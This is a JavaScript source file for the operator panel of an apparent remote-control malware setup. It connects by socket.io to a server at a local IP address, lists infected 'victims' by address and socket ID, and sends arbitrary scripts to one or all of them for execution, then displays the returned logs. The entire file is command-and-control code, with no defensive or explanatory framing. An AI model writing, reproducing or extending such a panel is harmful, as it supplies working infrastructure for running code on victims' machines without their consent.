
const socket = io('http://192.168.1.81:3001')

const victimListData = []
const ContainerVictimsListUi = document.querySelector('.victims')

function update_UI() {

    let li = document.getElementById('-1')
    li.children[1].textContent = `Total : ${victimListData.length}`
}
function updateVictims(newData) {
    newData.forEach(Element => {
        let Exist = 0;
        victimListData.forEach(victim => {
            if (victim.address == Element.address) {
                victim.socketId = Element.socketId
                Exist = 1;
            }
        })
        if (!Exist) {
            victimListData.push(Element)
            addToUi(Element.id, Element.address)
        }
    })
    update_UI()
}
function addToUi(id, address) {
    let iconProfile = document.createElement('span')
    iconProfile.classList.add("material-symbols-rounded")
    iconProfile.textContent = 'person'
    const hr = document.createElement('div')
    hr.classList.add('hr')
    let li = document.createElement('li')
    li.id = id
    li.addEventListener('click', () => {
        pickVictim(li.id)
    })
    let span = document.createElement('span')
    span.textContent = address
    li.appendChild(iconProfile)
    li.appendChild(span)
    ContainerVictimsListUi.appendChild(li)
    ContainerVictimsListUi.appendChild(hr)
}
function pickVictim(id) {
    let info = document.querySelector('.info')
    info.id = id
    if (id == '-1') {
        info.children[0].textContent = `address : _______`
        info.children[1].textContent = `socket ID : ________`
    } else {
        victimListData.map(victim => {
            if (victim.id == id) {
                info.children[0].textContent = `address : ${victim.address}`
                info.children[1].textContent = `socket ID : ${victim.socketId}`
            }
        })
    }
}
function executeScript(idSocket, script) {
    let data = {
        target: idSocket,
        script: script
    }
    

    if(socket.connected){
        socket.emit('script', data)
    }
}

let button = document.getElementById('execute')
button.addEventListener('click', () => {
    let info = document.querySelector('.info')
    let script = document.getElementById('script').value
    let idSocket;
    if (info.id != '-1') {
        idSocket = info.children[1].textContent.split(':')[1].substring(1)
    } else {
        idSocket = '-1'
    }
    executeScript(idSocket,script)
})

socket.on('update', (data) => {
    console.log('t')
    updateVictims(data)
})
socket.on('log',(log)=>{
    console.log(log)
    let result = document.querySelector('#resultScript')
    result.value = log.toString();
})